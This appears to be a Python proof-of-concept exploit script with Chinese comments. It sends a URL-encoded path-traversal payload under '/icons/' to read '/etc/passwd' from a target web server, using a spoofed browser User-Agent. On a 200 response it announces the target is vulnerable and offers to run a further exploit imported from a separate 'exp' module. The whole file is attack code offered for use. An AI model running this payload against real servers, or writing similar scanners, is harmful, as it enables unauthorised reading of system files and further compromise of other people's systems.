# 利用get 去拼接/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
import re
import urllib.request
from exp import exp


def poc(url):
    # if url.endswith('/') == True:
    #     request = re.sub('/\\n','',url)
    # else :
    #     request = re.sub('\\n','',url)
    try:
        headers = {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36'
        }
        # 模拟浏览器请求
        payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        url1 = url + payload
        request = urllib.request.Request(url=url1,headers=headers)
        # 获取响应内容
        response = urllib.request.urlopen(request)
        content = response.read().decode("utf-8")
        code =response.getcode()
        if code == 200 :
            tips = input('Congratulations, there is a vulnerability in this url, whether to execute EXP？Please enter Y or N:')
            if tips == 'Y' or tips == 'y':
                exp(url)
            elif tips ==  'N' or tips == 'n' :
                print('exit')
            else:
                tips = input('Congratulations, there is a vulnerability in this url, whether to execute EXP？Please enter Y or N:')
            return True
        
    except:
        print("gg")
        return False

        

